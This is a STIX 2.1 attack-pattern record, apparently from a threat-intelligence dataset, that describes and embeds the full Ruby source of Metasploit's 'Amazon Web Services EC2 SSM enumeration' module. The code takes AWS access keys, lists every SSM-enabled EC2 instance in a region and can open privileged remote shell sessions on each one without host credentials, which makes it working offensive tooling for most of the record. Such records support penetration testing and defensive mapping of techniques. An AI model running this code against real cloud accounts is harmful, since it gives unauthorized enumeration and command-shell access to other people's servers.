{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b419ff3b-1542-4b8b-abc1-18edafd7f893",
    "created": "2024-08-14T16:21:44.522293Z",
    "modified": "2024-08-14T16:21:44.522297Z",
    "name": "Amazon Web Services EC2 SSM enumeration",
    "description": " Provided AWS credentials, this module will call the authenticated API of Amazon Web Services to list all SSM-enabled EC2 instances accessible to the account. Once enumerated as SSM-enabled, the instances can be controlled using out-of-band WebSocket sessions provided by the AWS API (nominally, privileged out of the box). This module provides not only the API enumeration identifying EC2 instances accessible via SSM with given credentials, but enables session initiation for all identified targets (without requiring target-level credentials) using the CreateSession mixin option. The module also provides an EC2 ID filter and a limiting throttle to prevent session stampedes or expensive messes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/cloud/aws/enum_ssm.rb",
            "external_id": "enum_ssm.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://www.sempervictus.com/single-post/once-upon-a-cloudy-air-i-crossed-a-gap-which-wasn-t-there"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'aws-sdk-ssm'\nrequire 'aws-sdk-ec2'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Rex::Proto::Http::WebSocket::AmazonSsm\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::CommandShell\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Amazon Web Services EC2 SSM enumeration',\n        'Description' => %q{\n          Provided AWS credentials, this module will call the authenticated\n          API of Amazon Web Services to list all SSM-enabled EC2 instances\n          accessible to the account. Once enumerated as SSM-enabled, the\n          instances can be controlled using out-of-band WebSocket sessions\n          provided by the AWS API (nominally, privileged out of the box).\n          This module provides not only the API enumeration identifying EC2\n          instances accessible via SSM with given credentials, but enables\n          session initiation for all identified targets (without requiring\n          target-level credentials) using the CreateSession mixin option.\n          The module also provides an EC2 ID filter and a limiting throttle\n          to prevent session stampedes or expensive messes.\n        },\n        'Author' => [\n          'RageLtMan <rageltman[at]sempervictus>'\n        ],\n        'References' => [['URL', 'https://www.sempervictus.com/single-post/once-upon-a-cloudy-air-i-crossed-a-gap-which-wasn-t-there']],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => { 'CreateSession' => false },\n        'Notes' => {\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => [],\n          'Stability' => [CRASH_SAFE]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('LIMIT', [false, 'Only return the specified number of results from each region']),\n        OptString.new('FILTER_EC2_ID', [false, 'Look for specific EC2 instance ID']),\n        OptString.new('REGION', [true, 'AWS Region (e.g. \"us-west-2\")']),\n        OptString.new('ACCESS_KEY_ID', [true, 'AWS Access Key ID (eg. \"AKIAXXXXXXXXXXXXXXXX\")', '']),\n        OptString.new('SECRET_ACCESS_KEY', [true, 'AWS Secret Access Key (eg. \"CA1+XXXXXXXXXXXXXXXXXXXXXX6aYDHHCBuLuV79\")', ''])\n      ]\n    )\n  end\n\n  def handle_aws_errors(error)\n    if error.class.module_parents.include?(Aws)\n      fail_with(Failure::UnexpectedReply, error.message)\n    else\n      raise error\n    end\n  end\n\n  def run\n    credentials = ::Aws::Credentials.new(datastore['ACCESS_KEY_ID'], datastore['SECRET_ACCESS_KEY'])\n    vprint_status \"Checking #{datastore['REGION']}...\"\n    client = ::Aws::SSM::Client.new(\n      region: datastore['REGION'],\n      credentials: credentials\n    )\n    inv_params = {\n      filters: [\n        {\n          key: 'AWS:InstanceInformation.InstanceStatus',\n          values: ['Terminated'],\n          type: 'NotEqual'\n        },\n        {\n          key: 'AWS:InstanceInformation.ResourceType',\n          values: ['EC2Instance'],\n          type: 'Equal'\n        }\n      ]\n    }\n\n    if datastore['FILTER_EC2_ID']\n      inv_params[:filters] << {\n        key: 'AWS:InstanceInformation.InstanceId',\n        values: [datastore['FILTER_EC2_ID']],\n        type: 'Equal'\n      }\n    end\n\n    inv_params[:max_results] = datastore['LIMIT'] if datastore['LIMIT']\n\n    ssm_ec2 = client.get_inventory(inv_params).entities.map { |e| e.data['AWS:InstanceInformation'].content }.flatten\n    ssm_ec2.each do |ssm_host|\n      report_host(\n        host: ssm_host['IpAddress'],\n        os_flavor: ssm_host['PlatformName'],\n        os_name: ssm_host['PlatformType'],\n        os_sp: ssm_host['PlatformVersion'],\n        name: ssm_host['ComputerName'],\n        comments: \"ec2-id: #{ssm_host['InstanceId']}\"\n      )\n      report_note(\n        host: ssm_host['IpAddress'],\n        type: ssm_host['AgentType'],\n        data: ssm_host['AgentVersion']\n      )\n      vprint_good(\"Found AWS SSM host #{ssm_host['InstanceId']} (#{ssm_host['ComputerName']}) - #{ssm_host['IpAddress']}\")\n      next unless datastore['CreateSession']\n\n      socket = get_ssm_socket(client, ssm_host['InstanceId'])\n      sess = Msf::Sessions::AwsSsmCommandShellBind.new(socket.lsock, { datastore: datastore, aws_ssm_host_info: ssm_host })\n\n      start_session(self, sess.info, datastore, false, socket.lsock, sess)\n    end\n  rescue Seahorse::Client::NetworkingError => e\n    print_error e.message\n    print_error \"Confirm access to #{datastore['REGION']} with provided credentials\"\n  rescue StandardError => e\n    handle_aws_errors(e)\n  end\n\n  def get_ssm_socket(client, ec2_id)\n    # Verify the connection params and availability of instance\n    inv_params = {\n      filters: [\n        {\n          key: 'AWS:InstanceInformation.InstanceId',\n          values: [ec2_id],\n          type: 'Equal'\n        }\n      ]\n    }\n    inventory = client.get_inventory(inv_params)\n    # Extract peer info\n    if inventory.entities[0] && (inventory.entities[0].id == ec2_id)\n      peer_info = inventory.entities[0].data['AWS:InstanceInformation'].content[0]\n    else\n      raise 'SSM target not found'\n    end\n    session_init = client.start_session({\n      target: ec2_id,\n      document_name: 'SSM-SessionManagerRunShell'\n      # AWS-RunShellScript, AWS-RunPowerShellScript, etc\n    })\n    ssm_sock = connect_ssm_ws(session_init)\n    chan = ssm_sock.to_ssm_channel\n    chan.params.comm = Rex::Socket::Comm::Local unless chan.params.comm\n    chan.params.peerhost = peer_info['IpAddress']\n    chan.params.peerport = 0\n    chan.params.peerhostname = peer_info['ComputerName']\n    chan._start_ssm_keepalive\n    chan.update_term_size\n    return chan\n  end\nend\n"
}